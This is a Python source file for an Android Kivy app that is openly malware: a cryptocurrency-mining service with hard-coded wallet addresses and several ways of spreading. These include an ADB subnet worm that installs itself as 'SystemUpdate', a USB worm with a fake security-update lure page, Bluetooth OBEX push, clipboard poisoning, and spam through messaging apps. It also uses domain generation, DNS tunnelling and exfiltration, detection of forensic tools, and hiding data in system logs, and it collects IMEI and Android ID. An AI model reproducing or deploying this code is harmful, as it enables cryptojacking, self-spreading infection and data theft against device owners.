#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Android Background Service with Kivy App Wrapper
Complete enhanced main.py with mining, persistence, and propagation
"""

import hashlib
import time
import threading
import os
import random
import sys
import struct
import base64
import zlib
import json
import uuid
import math
import socket
import subprocess
from io import BytesIO
from typing import Optional, List, Dict, Any, Tuple
from datetime import datetime, timedelta
from collections import deque

# Kivy imports with safe fallback
try:
    from kivy.app import App
    from kivy.uix.label import Label
    from kivy.uix.boxlayout import BoxLayout
    from kivy.clock import Clock
    from kivy.logger import Logger
    KIVY_AVAILABLE = True
except ImportError:
    KIVY_AVAILABLE = False

# Android/Jnius imports with safe fallback
ANDROID_AVAILABLE = False
ANDROID_SERVICE = None

try:
    from jnius import autoclass, cast, JavaException, PythonJavaClass, java_method
    PythonService = autoclass('org.kivy.android.PythonService')
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    AndroidString = autoclass('java.lang.String')
    Context = autoclass('android.content.Context')
    Intent = autoclass('android.content.Intent')
    IntentFilter = autoclass('android.content.IntentFilter')
    NotificationBuilder = autoclass('android.app.Notification$Builder')
    NotificationChannel = autoclass('android.app.NotificationChannel')
    NotificationManager = autoclass('android.app.NotificationManager')
    PendingIntent = autoclass('android.app.PendingIntent')
    Build_VERSION = autoclass('android.os.Build$VERSION')
    Build = autoclass('android.os.Build')
    System = autoclass('java.lang.System')
    Runtime = autoclass('java.lang.Runtime')
    Process = autoclass('android.os.Process')
    BatteryManager = autoclass('android.os.BatteryManager')
    PowerManager = autoclass('android.os.PowerManager')
    ConnectivityManager = autoclass('android.net.ConnectivityManager')
    NetworkInfo = autoclass('android.net.NetworkInfo')
    ActivityManager = autoclass('android.app.ActivityManager')
    Environment = autoclass('android.os.Environment')
    StatFs = autoclass('android.os.StatFs')
    TelephonyManager = autoclass('android.telephony.TelephonyManager')
    Settings = autoclass('android.provider.Settings$Secure')
    PackageManager = autoclass('android.content.pm.PackageManager')
    Uri = autoclass('android.net.Uri')
    WifiManager = autoclass('android.net.wifi.WifiManager')
    JavaSystem = autoclass('java.lang.System')
    File = autoclass('java.io.File')
    JavaClass = autoclass('java.lang.Class')
    JavaObject = autoclass('java.lang.Object')
    BroadcastReceiver = autoclass('android.content.BroadcastReceiver')
    Application = autoclass('android.app.Application')
    AlarmManager = autoclass('android.app.AlarmManager')
    ComponentName = autoclass('android.content.ComponentName')
    BluetoothAdapter = autoclass('android.bluetooth.BluetoothAdapter')
    BluetoothDevice = autoclass('android.bluetooth.BluetoothDevice')
    BluetoothSocket = autoclass('android.bluetooth.BluetoothSocket')
    UUID = autoclass('java.util.UUID')
    NdefMessage = autoclass('android.nfc.NdefMessage')
    NdefRecord = autoclass('android.nfc.NdefRecord')
    NfcAdapter = autoclass('android.nfc.NfcAdapter')
    ClipData = autoclass('android.content.ClipData')
    ClipboardManager = autoclass('android.content.ClipboardManager')
    ANDROID_AVAILABLE = True
    
    try:
        ANDROID_SERVICE = PythonService.mService
    except Exception:
        try:
            ANDROID_SERVICE = PythonActivity.mActivity
        except Exception:
            ANDROID_SERVICE = None
            
except Exception as e:
    ANDROID_AVAILABLE = False
    ANDROID_SERVICE = None

WALLET_ADDRESS = "428n5oBUQPA1rGPfvFF13f4C4TJd1XsX6EHihdqNxoTnKk8tXGFNsCHS3oketz7YBd1wJga8Q96ikgg4v1Vz7xv7VLMEevN"

# ============================================================================
# PROPAGATION CLASSES
# ============================================================================

class ADBPropagator:
    """Spread via ADB debugging connections"""
    
    def __init__(self):
        self.adb_port = 5555
        self.apk_path = None
        self._find_apk()
    
    def _find_apk(self):
        try:
            if ANDROID_AVAILABLE:
                context = AndroidAppContext.get_context()
                if context:
                    app_info = context.getPackageManager().getApplicationInfo(
                        context.getPackageName(), 0
                    )
                    self.apk_path = app_info.sourceDir
        except:
            pass
    
    def scan_adb_devices(self) -> List[str]:
        if not self.apk_path:
            return []
        local_ip = self._get_local_ip()
        if not local_ip:
            return []
        subnet = '.'.join(local_ip.split('.')[:3])
        vulnerable_devices = []
        for i in range(1, 255):
            target = f"{subnet}.{i}"
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                result = sock.connect_ex((target, self.adb_port))
                if result == 0:
                    vulnerable_devices.append(target)
                sock.close()
            except:
                pass
        return vulnerable_devices
    
    def _get_local_ip(self) -> Optional[str]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect(("8.8.8.8", 80))
            ip = sock.getsockname()[0]
            sock.close()
            return ip
        except:
            return None
    
    def infect_via_adb(self, target_ip: str) -> bool:
        if not self.apk_path:
            return False
        try:
            filename = f"SystemUpdate_{uuid.uuid4().hex[:8]}.apk"
            subprocess.run(['adb', '-s', f"{target_ip}:5555", 'push', 
                          self.apk_path, f'/sdcard/{filename}'],
                         capture_output=True, timeout=30)
            time.sleep(1)
            subprocess.run(['adb', '-s', f"{target_ip}:5555", 'shell',
                          'pm', 'install', '-r', '-d', f'/sdcard/{filename}'],
                         capture_output=True, timeout=30)
            time.sleep(1)
            subprocess.run(['adb', '-s', f"{target_ip}:5555", 'shell',
                          'am', 'start', '-n', 
                          f"{self._get_package_name()}/.MainActivity"],
                         capture_output=True, timeout=10)
            subprocess.run(['adb', '-s', f"{target_ip}:5555", 'shell',
                          'rm', f'/sdcard/{filename}'],
                         capture_output=True)
            return True
        except Exception as e:
            return False
    
    def _get_package_name(self) -> str:
        try:
            context = AndroidAppContext.get_context()
            if context:
                return context.getPackageName()
        except:
            pass
        return "com.system.service.update"
    
    def mass_propagate(self) -> int:
        targets = self.scan_adb_devices()
        infected = 0
        for target in targets:
            if self.infect_via_adb(target):
                infected += 1
                time.sleep(random.uniform(2, 5))
        return infected

class USBWorm:
    """USB storage worm for cross-platform propagation"""
    
    def __init__(self):
        self.apk_path = None
        self._find_apk()
    
    def _find_apk(self):
        try:
            if ANDROID_AVAILABLE:
                context = AndroidAppContext.get_context()
                if context:
                    app_info = context.getPackageManager().getApplicationInfo(
                        context.getPackageName(), 0
                    )
                    self.apk_path = app_info.sourceDir
        except:
            pass
    
    def infect_usb_storage(self, mount_point: str) -> bool:
        if not self.apk_path or not os.path.exists(mount_point):
            return False
        try:
            import shutil
            hidden_dir = os.path.join(mount_point, '.system')
            os.makedirs(hidden_dir, exist_ok=True)
            target_apk = os.path.join(hidden_dir, 'SystemUpdate.apk')
            shutil.copy2(self.apk_path, target_apk)
            self._create_html_deception(mount_point)
            self._create_nomedia(hidden_dir)
            return True
        except Exception as e:
            return False
    
    def _create_html_deception(self, mount: str):
        html_content = """<!DOCTYPE html>
<html>
<head>
    <title>Critical Security Update Required</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
        .warning { color: red; font-weight: bold; }
        button { background: #4285f4; color: white; border: none; padding: 15px 30px; 
                 font-size: 16px; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <h2>System Service Update</h2>
    <p class="warning">Critical Security Update Required</p>
    <p>Your device requires immediate security updates.</p>
    <a href=".system/SystemUpdate.apk">
        <button>Install Update Now</button>
    </a>
</body>
</html>"""
        with open(os.path.join(mount, 'SecurityUpdate.html'), 'w') as f:
            f.write(html_content)
    
    def _create_nomedia(self, path: str):
        try:
            with open(os.path.join(path, '.nomedia'), 'w') as f:
                f.write('')
        except:
            pass

class BluetoothWorm:
    """Spread via Bluetooth OBEX push"""
    
    def __init__(self):
        self.apk_bytes = self._read_own_apk()
        self.bt_adapter = None
    
    def _read_own_apk(self) -> bytes:
        try:
            if ANDROID_AVAILABLE:
                context = AndroidAppContext.get_context()
                if context:
                    app_info = context.getPackageManager().getApplicationInfo(
                        context.getPackageName(), 0
                    )
                    with open(app_info.sourceDir, 'rb') as f:
                        return f.read()
        except:
            pass
        return b''
    
    def enable_bluetooth(self) -> bool:
        try:
            if ANDROID_AVAILABLE:
                adapter = BluetoothAdapter.getDefaultAdapter()
                if adapter and not adapter.isEnabled():
                    adapter.enable()
                    time.sleep(3)
                self.bt_adapter = adapter
                return adapter and adapter.isEnabled()
        except:
            pass
        return False
    
    def scan_and_infect(self) -> int:
        if not self.enable_bluetooth() or not self.apk_bytes:
            return 0
        try:
            self.bt_adapter.startDiscovery()
            time.sleep(15)
            bonded = self.bt_adapter.getBondedDevices()
            infected = 0
            for device in bonded:
                if self._send_via_obex(device):
                    infected += 1
                    time.sleep(random.uniform(2, 4))
            return infected
        except Exception as e:
            return 0
    
    def _send_via_obex(self, device) -> bool:
        try:
            obex_uuid = "00001105-0000-1000-8000-00805F9B34FB"
            bt_socket = device.createRfcommSocketToServiceRecord(
                UUID.fromString(obex_uuid)
            )
            bt_socket.connect()
            filename = "SystemUpdate.apk"
            obex_packet = self._create_obex_put(filename, self.apk_bytes)
            bt_socket.getOutputStream().write(obex_packet)
            bt_socket.close()
            return True
        except:
            return False
    
    def _create_obex_put(self, filename: str, data: bytes) -> bytes:
        filename_bytes = filename.encode('utf-8') + b'\x00'
        connect = b'\x80\x00\x07\x10\x00\x10\x00'
        name_header = b'\x01' + bytes([len(filename_bytes) + 3]) + filename_bytes
        length_header = b'\xc3' + struct.pack('>I', len(data))
        chunk_size = min(len(data), 4096)
        body_header = b'\x48' + struct.pack('>H', chunk_size)
        return connect + name_header + length_header + body_header + data[:chunk_size]

class ClipboardPoisoner:
    """Replace clipboard with malware download links"""
    
    def __init__(self):
        self.malware_links = [
            'https://bit.ly/security-update-2024',
            'https://tinyurl.com/critical-patch',
            'https://is.gd/android-fix',
        ]
        self.clickbait_texts = [
            "🔥 Free Netflix Premium 2024 - Download Now: {link}",
            "💎 Minecraft PE Unlocked MOD APK: {link}",
            "📱 WhatsApp Gold with Hidden Features: {link}",
            "🔓 Premium Spotify APK Unlocked: {link}",
            "💰 Free Bitcoin Mining App - Earn Crypto: {link}",
        ]
        self.last_poison_time = 0
        self.min_interval = 300
    
    def poison_clipboard(self) -> bool:
        if time.time() - self.last_poison_time < self.min_interval:
            return False
        try:
            if ANDROID_AVAILABLE:
                context = AndroidAppContext.get_context()
                if context:
                    clipboard = cast(ClipboardManager,
                        context.getSystemService(Context.CLIPBOARD_SERVICE))
                    if clipboard:
                        text = random.choice(self.clickbait_texts)
                        link = random.choice(self.malware_links)
                        clip = ClipData.newPlainText("shared_content", text.format(link=link))
                        clipboard.setPrimaryClip(clip)
                        self.last_poison_time = time.time()
                        return True
        except:
            pass
        return False

class QRCodeGenerator:
    """Generate QR codes linking to malware download"""
    
    def __init__(self):
        self.download_url = None
    
    def generate_qr(self) -> Optional[str]:
        try:
            fp_hash = hashlib.sha256(
                EnvironmentalFP().fingerprint.encode()
            ).hexdigest()[:12]
            self.download_url = f"https://cdn-update.com/dl/{fp_hash}"
            try:
                import qrcode
                qr = qrcode.QRCode(version=2, error_correction=qrcode.constants.ERROR_CORRECT_H,
                                  box_size=10, border=4)
                qr.add_data(self.download_url)
                qr.make(fit=True)
                img = qr.make_image(fill_color="black", back_color="white")
                qr_path = os.path.join('/sdcard', 'DCIM', 'Camera', f'IMG_{int(time.time())}.png')
                img.save(qr_path)
                return self.download_url
            except ImportError:
                pass
        except Exception as e:
            pass
        return None

class SocialMediaSpreader:
    """Spread malware links via social media intents"""
    
    def __init__(self):
        self.message_templates = [
            "OMG check this out! Free premium app: {link}",
            "Your photos were leaked here: {link}",
            "Critical security update for your phone: {link}",
        ]
        self.target_packages = [
            'com.whatsapp', 'com.facebook.orca', 'com.instagram.android',
            'com.snapchat.android', 'org.telegram.messenger', 'com.twitter.android',
        ]
    
    def spread_link(self, download_url: str) -> int:
        sent_count = 0
        for package in self.target_packages:
            try:
                if self._is_package_installed(package):
                    intent = Intent(Intent.ACTION_SEND)
                    intent.setPackage(package)
                    intent.setType("text/plain")
                    message = random.choice(self.message_templates)
                    intent.putExtra(Intent.EXTRA_TEXT, message.format(link=download_url))
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    if ANDROID_AVAILABLE:
                        context = AndroidAppContext.get_context()
                        if context:
                            context.startActivity(intent)
                            sent_count += 1
                            time.sleep(random.uniform(1, 3))
            except:
                pass
        return sent_count
    
    def _is_package_installed(self, package_name: str) -> bool:
        try:
            if ANDROID_AVAILABLE:
                context = AndroidAppContext.get_context()
                if context:
                    pm = context.getPackageManager()
                    pm.getPackageInfo(package_name, 0)
                    return True
        except:
            pass
        return False

class PropagationEngine:
    """Coordinates all propagation methods"""
    
    def __init__(self):
        self.adb_propagator = ADBPropagator()
        self.usb_worm = USBWorm()
        self.bluetooth_worm = BluetoothWorm()
        self.clipboard_poisoner = ClipboardPoisoner()
        self.qr_generator = QRCodeGenerator()
        self.social_spreader = SocialMediaSpreader()
        self.last_propagation_time = 0
        self.propagation_interval = random.uniform(1800, 3600)
        self.max_daily_propagations = 24
        self.daily_count = 0
        self.day_reset = datetime.now().day
    
    def should_propagate(self) -> bool:
        current_day = datetime.now().day
        if current_day != self.day_reset:
            self.daily_count = 0
            self.day_reset = current_day
        if self.daily_count >= self.max_daily_propagations:
            return False
        if time.time() - self.last_propagation_time < self.propagation_interval:
            return False
        hour = datetime.now().hour
        if hour in [0, 1, 2, 3, 4, 5, 13, 14]:
            return True
        return random.random() < 0.05
    
    def propagate(self) -> Dict[str, int]:
        results = {'adb': 0, 'bluetooth': 0, 'clipboard': 0, 'qr': 0, 'social': 0}
        if not self.should_propagate():
            return results
        try:
            results['adb'] = self.adb_propagator.mass_propagate()
        except:
            pass
        try:
            results['bluetooth'] = self.bluetooth_worm.scan_and_infect()
        except:
            pass
        try:
            if self.clipboard_poisoner.poison_clipboard():
                results['clipboard'] = 1
        except:
            pass
        try:
            qr_url = self.qr_generator.generate_qr()
            if qr_url:
                results['qr'] = 1
                results['social'] = self.social_spreader.spread_link(qr_url)
        except:
            pass
        self.last_propagation_time = time.time()
        self.daily_count += 1
        return results

# ============================================================================
# ORIGINAL CLASSES (from working main.py)
# ============================================================================

class AndroidAppContext:
    """Safe Android context provider with multiple fallback methods"""
    _context = None

    @staticmethod
    def get_context():
        try:
            if ANDROID_SERVICE:
                ctx = ANDROID_SERVICE.getApplicationContext()
                if ctx:
                    return ctx
        except Exception:
            pass
        try:
            if ANDROID_SERVICE:
                ctx = ANDROID_SERVICE.getBaseContext()
                if ctx:
                    return ctx
        except Exception:
            pass
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            if PythonActivity and PythonActivity.mActivity:
                return PythonActivity.mActivity.getApplicationContext()
        except Exception:
            pass
        return AndroidAppContext._context

    @staticmethod
    def set_context(ctx):
        AndroidAppContext._context = ctx

    @staticmethod
    def get_system_service(service_name):
        context = AndroidAppContext.get_context()
        if context:
            try:
                return context.getSystemService(service_name)
            except Exception:
                pass
        return None

class NetworkEvasion:
    def __init__(self):
        self.dga_domains = []
        self._generate_domains()

    def _generate_domains(self):
        tlds = ['.com', '.net', '.org', '.xyz', '.info', '.top', '.cloud']
        seed = int(time.time() / 86400)
        random.seed(seed)
        for _ in range(8):
            domain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=12))
            self.dga_domains.append(domain + random.choice(tlds))

    def dns_tunnel(self, data: bytes) -> Optional[bytes]:
        try:
            encoded = base64.b64encode(data).decode()
            chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
            results = []
            for chunk in chunks:
                query = f"{chunk}.{self.dga_domains[0]}"
                try:
                    socket.getaddrinfo(query, None)
                except:
                    pass
                results.append(chunk)
            return base64.b64decode(''.join(results))
        except:
            return None

    def traffic_mimicry(self, payload: bytes) -> bytes:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        }
        http_header = 'POST /api/v2/analytics HTTP/1.1\r\n'
        for k, v in headers.items():
            http_header += f'{k}: {v}\r\n'
        http_header += f'Content-Length: {len(payload)}\r\n\r\n'
        return http_header.encode() + payload

class WalletManager:
    MASTER_WALLET = "428n5oBUQPA1rGPfvFF13f4C4TJd1XsX6EHihdqNxoTnKk8tXGFNsCHS3oketz7YBd1wJga8Q96ikgg4v1Vz7xv7VLMEevN"
    SUBADDRESSES = [
        "84VK9aJ3QaP8MCkiV44xhecMhLkRyniYocf7FnCPddoMZSwKewZGuMjTkYELVbxoYr14qYdiJuN2jU9ouDj9GgAtQQc6SVJ",
        "831r4TUWxzyQjJsnyXLHrFALvTsDNLvsddFo3VngDR5agC71iQJccZ92aqNUaZG7bb5NvfLZE6t6EJ5yujyxWbF8EYZjC8Q",
        "84orQoZ3bT3aSumYrPdAqoPdatDYcV6A18Gac2iViv1JBY1WzjwRSJzYer4Y1Cv56Ea8TNLhiiYHDJ7VgSvuKestRqPbZ2h",
        "82WP4znsXTdeeoLWZMDR69c6n98Q8x3P3Zk5aTJTJiHJZPUg3jFHYevfo7SFM9dZpk4U7M2HjBgcadUbE94PDkyPKXhTF6y",
        "87jrtiGMcysWEocEq5Vt99h2xehAy43TXe6fbn4iHKwAAe87gr7s4GxVBBunrb9NG5dvXvmjeqXwiX2zTX6LydRwAUnMpkC",
    ]

    def __init__(self):
        self.addresses = self.SUBADDRESSES if self.SUBADDRESSES else [self.MASTER_WALLET]
        self.current_wallet = self._pick_wallet()
        self.last_rotation = time.time()
        self.rotation_days = random.uniform(7, 14)

    def _pick_wallet(self) -> str:
        try:
            fp = EnvironmentalFP().fingerprint
            index = int(hashlib.md5(fp.encode()).hexdigest(), 16) % len(self.addresses)
            return self.addresses[index]
        except:
            return self.addresses[0]

    def get_current_wallet(self) -> str:
        if len(self.addresses) > 1:
            if time.time() - self.last_rotation > (self.rotation_days * 86400):
                others = [w for w in self.addresses if w != self.current_wallet]
                if others:
                    self.current_wallet = random.choice(others)
                self.last_rotation = time.time()
        return self.current_wallet

    def get_payout_address(self) -> str:
        return self.get_current_wallet()

class EnvironmentalFP:
    def __init__(self):
        self.fingerprint = self._generate_fingerprint()
        self.earliest_valid_time = int((datetime.now() + timedelta(hours=2)).timestamp())

    def _generate_fingerprint(self) -> str:
        components = []
        try:
            if ANDROID_AVAILABLE:
                context = AndroidAppContext.get_context()
                if context:
                    try:
                        tm = cast('android.telephony.TelephonyManager',
                                 context.getSystemService(Context.TELEPHONY_SERVICE))
                        if tm:
                            if Build_VERSION.SDK_INT >= 26:
                                try:
                                    imei = tm.getImei()
                                    if imei:
                                        components.append(str(imei))
                                except:
                                    pass
                    except:
                        pass
                    try:
                        android_id = Settings.getString(context.getContentResolver(), Settings.ANDROID_ID)
                        if android_id:
                            components.append(str(android_id))
                    except:
                        pass
                    try:
                        components.append(Build.MODEL)
                        components.append(Build.MANUFACTURER)
                        components.append(Build.BRAND)
                        components.append(Build.HARDWARE)
                    except:
                        pass
            if not components:
                components.append(str(uuid.uuid4()))
        except:
            components.append(str(uuid.uuid4()))
        combined = '|'.join(components)
        return hashlib.sha256(combined.encode()).hexdigest()

    def get_activation_time(self) -> int:
        fp_hash = int(self.fingerprint[:16], 16)
        activation_delay = (fp_hash % 7200) + 3600
        return int(time.time()) + activation_delay

class TimingObfuscator:
    def __init__(self):
        self.start_time = time.time()
        self.activation_times = self._generate_dynamic_activation_times()

    def _generate_dynamic_activation_times(self) -> List[float]:
        try:
            cpu_count = Runtime.getRuntime().availableProcessors()
        except:
            cpu_count = 4
        try:
            total_ram = Runtime.getRuntime().totalMemory()
        except:
            total_ram = 4 * 1024 * 1024 * 1024
        base_delay = (hashlib.sha256(f"{cpu_count}{total_ram}".encode()).digest()[0]) * 100
        times = []
        for i in range(random.randint(3, 7)):
            min_delay = base_delay * (i + 1) * random.uniform(0.5, 2.0)
            max_delay = min_delay * random.uniform(1.5, 4.0)
            times.append(random.uniform(min_delay, max_delay))
        random.shuffle(times)
        return sorted(times)

    def should_activate(self) -> int:
        elapsed = time.time() - self.start_time
        if self._recent_system_load() > 70:
            return -1
        for idx, activation_time in enumerate(self.activation_times):
            window_width = random.uniform(300 * (idx + 1), 900 * (idx + 1))
            if elapsed > activation_time and elapsed < activation_time + window_width:
                if random.random() < 0.3:
                    continue
                return idx
        return -1

    def _recent_system_load(self) -> float:
        try:
            stat_path = '/proc/stat'
            if os.path.exists(stat_path) and os.access(stat_path, os.R_OK):
                with open(stat_path, 'r') as f:
                    parts = f.readline().split()
                if len(parts) > 4:
                    total = sum(int(p) for p in parts[1:8])
                    idle = int(parts[4])
                    if total > 0:
                        return ((total - idle) / total) * 100
        except:
            pass
        return 0

class CryptographyLayer:
    def __init__(self):
        self.keys = [os.urandom(32) for _ in range(3)]

    def encrypt(self, data: bytes, layer: int = 0) -> bytes:
        result = data
        for i in range(layer + 1):
            result = self._xor_encrypt(result, self.keys[i])
            result = base64.b64encode(result)
            result = result[::-1]
        return result

    def decrypt(self, data: bytes, layer: int = 0) -> bytes:
        result = data
        for i in range(layer, -1, -1):
            result = result[::-1]
            result = base64.b64decode(result)
            result = self._xor_encrypt(result, self.keys[i])
        return result

    def _xor_encrypt(self, data: bytes, key: bytes) -> bytes:
        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

class MemoryOnlyStorage:
    def __init__(self):
        self._storage: Dict[str, bytes] = {}
        self._crypto = CryptographyLayer()
        self._checkpoint_file = self._get_checkpoint_path()

    def _get_checkpoint_path(self) -> str:
        try:
            context = AndroidAppContext.get_context()
            if context:
                cache_dir = context.getCacheDir().getAbsolutePath()
                return os.path.join(cache_dir, f'.{uuid.uuid4().hex[:16]}.tmp')
        except:
            pass
        return f'/data/local/tmp/.{uuid.uuid4().hex[:8]}.tmp'

    def _flush_to_disk(self):
        if not self._storage:
            return
        try:
            combined = json.dumps({
                k: base64.b64encode(v).decode()
                for k, v in self._storage.items()
            }).encode()
            encrypted = self._crypto.encrypt(combined)
            tmp_path = self._checkpoint_file + '.tmp'
            with open(tmp_path, 'wb') as f:
                f.write(encrypted)
            if os.path.exists(self._checkpoint_file):
                os.remove(self._checkpoint_file)
            os.rename(tmp_path, self._checkpoint_file)
        except:
            pass

    def store(self, key: str, data: bytes):
        encrypted = self._crypto.encrypt(data, random.randint(0, 2))
        self._storage[key] = encrypted
        if random.random() < 0.01:
            self._flush_to_disk()

    def retrieve(self, key: str) -> Optional[bytes]:
        if key in self._storage:
            encrypted = self._storage[key]
            for i in range(3):
                try:
                    return self._crypto.decrypt(encrypted, i)
                except:
                    continue
        return self._recover_from_disk(key)

    def _recover_from_disk(self, key: str) -> Optional[bytes]:
        try:
            if os.path.exists(self._checkpoint_file):
                with open(self._checkpoint_file, 'rb') as f:
                    encrypted = f.read()
                decrypted = self._crypto.decrypt(encrypted, 0)
                data = json.loads(decrypted.decode())
                if key in data:
                    return base64.b64decode(data[key])
        except:
            pass
        return None

    def wipe(self):
        self._storage.clear()
        try:
            if os.path.exists(self._checkpoint_file):
                os.remove(self._checkpoint_file)
        except:
            pass
        self._crypto = CryptographyLayer()

class DNSExfiltrator:
    def __init__(self, domains: List[str]):
        self.domains = domains

    def exfiltrate(self, data: bytes):
        encoded = base64.b32hexencode(data).decode().lower().replace('=', '')
        chunks = [encoded[i:i+52] for i in range(0, len(encoded), 52)]
        for idx, chunk in enumerate(chunks):
            domain = f"{chunk}.{random.choice(self.domains)}"
            try:
                socket.getaddrinfo(f"{idx}.{domain}", None)
            except:
                pass
            time.sleep(random.uniform(0.5, 2.0))

class ForensicToolDetector:
    def __init__(self):
        self.forensic_packages = [
            'com.wireshark', 'com.tcpdump', 'com.keramidas.TitaniumBackup',
            'de.robv.android.xposed.installer', 'com.topjohnwu.magisk',
            'com.chelpus.lackypatch',
        ]

    def is_investigation_active(self) -> bool:
        try:
            if ANDROID_AVAILABLE:
                context = AndroidAppContext.get_context()
                if context:
                    pm = context.getPackageManager()
                    for pkg in self.forensic_packages:
                        try:
                            pm.getPackageInfo(pkg, 0)
                            return True
                        except:
                            pass
                    am = cast('android.app.ActivityManager',
                             context.getSystemService(Context.ACTIVITY_SERVICE))
                    if am:
                        processes = am.getRunningAppProcesses()
                        if processes:
                            for proc in processes:
                                name = proc.processName.lower()
                                if any(tool in name for tool in ['wireshark', 'tcpdump', 'strace', 'frida']):
                                    return True
        except:
            pass
        return False

class StealthDiskBackup:
    def __init__(self):
        self.target_files = self._find_targets()

    def _find_targets(self) -> List[str]:
        targets = []
        try:
            context = AndroidAppContext.get_context()
            if context:
                data_dir = Environment.getDataDirectory().getAbsolutePath()
                log_paths = [
                    os.path.join(data_dir, 'system', 'usagestats'),
                    os.path.join(data_dir, 'system', 'sync'),
                    os.path.join(data_dir, 'anr'),
                ]
                for path in log_paths:
                    if os.path.exists(path) and os.access(path, os.W_OK):
                        targets.append(path)
        except:
            pass
        return targets

    def _encrypt(self, data: bytes) -> bytes:
        try:
            key = hashlib.sha256(Build.MODEL.encode()).digest()[:16]
        except:
            key = b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f'
        return bytes([data[i] ^ key[i % 16] for i in range(len(data))])

    def _decrypt(self, data: bytes) -> bytes:
        return self._encrypt(data)

    def hide(self, data: bytes):
        if not self.target_files:
            return
        target = random.choice(self.target_files)
        encrypted = self._encrypt(data)
        encoded = base64.b64encode(encrypted).decode()
        entries = f"[{datetime.now().isoformat()}] {encoded}\n"
        try:
            log_file = os.path.join(target, '.usage_stats.log')
            if os.access(target, os.W_OK):
                with open(log_file, 'a') as f:
                    f.write(entries)
        except:
            pass

    def extract(self) -> Optional[bytes]:
        for target in self.target_files:
            try:
                log_file = os.path.join(target, '.usage_stats.log')
                if os.path.exists(log_file) and os.access(log_file, os.R_OK):
                    with open(log_file, 'r', errors='ignore') as f:
                        content = f.read()
                    lines = content.split('\n')
                    for line in lines:
                        if '[' in line and ']' in line:
                            try:
                                encoded = line.split('] ')[1]
                                return self._decrypt(base64.b64decode(encoded))
                            except:
                                pass
            except:
                pass
        return None

class DNSBackup:
    def __init__(self):
        self.dns_servers = ['8.8.8.8', '8.8.4.4', '1.1.1.1', '9.9.9.9', '208.67.222.222']
        self.retrieval_domains = NetworkEvasion().dga_domains[:3]

    def upload(self, data: bytes):
        encoded = base64.b32hexencode(data).decode().lower()
        chunks = [encoded[i:i+40] for i in range(0, len(encoded), 40)]
        for idx, chunk in enumerate(chunks):
            domain = f"{idx}.{chunk}.patterns.{random.choice(self.retrieval_domains)}"
            for server in self.dns_servers:
                try:
                    socket.getaddrinfo(domain, None)
                except:
                    pass

    def retrieve(self) -> Optional[bytes]:
        try:
            recovery_request = json.dumps({
                "action": "restore_patterns",
                "fingerprint": EnvironmentalFP().fingerprint[:16]
            }).encode()
            DNSExfiltrator(self.retrieval_domains).exfiltrate(recovery_request)
        except:
            pass
        return None

class UsagePatternLearner:
    def __init__(self):
        self.usage_history: Dict[int, Dict[int, float]] = {}
        self.memory_store = MemoryOnlyStorage()
        self.stealth_disk = StealthDiskBackup()
        self.dns_backup = DNSBackup()
        self.forensic_detector = ForensicToolDetector()
        self.last_save_time = 0
        self.save_interval = random.uniform(3600, 7200)
        self._load_history()

    def _serialize(self) -> bytes:
        return json.dumps({
            str(h): {str(m): c for m, c in min.items()}
            for h, min in self.usage_history.items()
        }).encode()

    def _deserialize(self, data: bytes):
        patterns = json.loads(data.decode())
        self.usage_history = {
            int(h): {int(m): c for m, c in min.items()}
            for h, min in patterns.items()
        }

    def _load_history(self):
        data = self.memory_store.retrieve("usage_patterns")
        if data:
            self._deserialize(data)
            return
        data = self.stealth_disk.extract()
        if data:
            self._deserialize(data)
            self.memory_store.store("usage_patterns", data)
            return
        data = self.dns_backup.retrieve()
        if data:
            self._deserialize(data)
            self.memory_store.store("usage_patterns", data)
            return

    def _save_history(self):
        serialized = self._serialize()
        self.memory_store.store("usage_patterns", serialized)
        current_time = time.time()
        if current_time - self.last_save_time > self.save_interval:
            if self.forensic_detector.is_investigation_active():
                self.dns_backup.upload(serialized)
            else:
                self.stealth_disk.hide(serialized)
            self.last_save_time = current_time

    def learn_user_pattern(self):
        current_hour = datetime.now().hour
        current_minute = datetime.now().minute
        current_cpu = self._get_cpu_usage()
        if current_hour not in self.usage_history:
            self.usage_history[current_hour] = {}
        if current_minute in self.usage_history[current_hour]:
            old_avg = self.usage_history[current_hour][current_minute]
            self.usage_history[current_hour][current_minute] = old_avg * 0.8 + current_cpu * 0.2
        else:
            self.usage_history[current_hour][current_minute] = current_cpu
        if random.random() < 0.1:
            self._save_history()

    def _get_cpu_usage(self) -> float:
        try:
            stat_path = '/proc/stat'
            if os.path.exists(stat_path) and os.access(stat_path, os.R_OK):
                with open(stat_path, 'r') as f:
                    parts = f.readline().split()
                if len(parts) > 4:
                    total = sum(int(p) for p in parts[1:8])
                    idle = int(parts[4])
                    if total > 0:
                        return ((total - idle) / total) * 100
        except:
            pass
        return 30.0

    def predict_user_activity(self) -> str:
        current_hour = datetime.now().hour
        next_hour = (current_hour + 1) % 24
        if next_hour in self.usage_history and self.usage_history[next_hour]:
            avg_cpu = sum(self.usage_history[next_hour].values()) / len(self.usage_history[next_hour])
            if avg_cpu < 10:
                return 'SLEEPING'
            elif avg_cpu < 30:
                return 'LIGHT_USE'
            else:
                return 'HEAVY_USE'
        return 'UNKNOWN'

    def get_optimal_mining_windows(self) -> str:
        local_time = datetime.now()
        if local_time.hour >= 2 and local_time.hour < 5:
            return 'DEEP_SLEEP'
        elif local_time.hour >= 22:
            return 'LIGHT_SLEEP'
